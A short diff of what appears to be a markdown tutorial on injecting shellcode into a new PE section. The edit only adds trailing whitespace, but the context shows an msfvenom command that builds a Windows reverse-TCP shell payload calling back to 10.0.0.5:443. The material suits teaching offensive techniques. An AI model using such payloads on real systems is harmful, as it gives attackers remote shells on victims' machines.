@@ -13,5 +13,5 @@
 *First of, let's generate the shellcode so we know how many bytes of space we will need in the new PE section:*
 
 ```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 | hexdump -C```
-![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/fb73271e-7bcc-4e0f-bf7b-a0dab96a4d04)
+![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/fb73271e-7bcc-4e0f-bf7b-a0dab96a4d04)  
 *Note that the shellcode size is 324 bytes - the new PE section will have to be at least that big.*
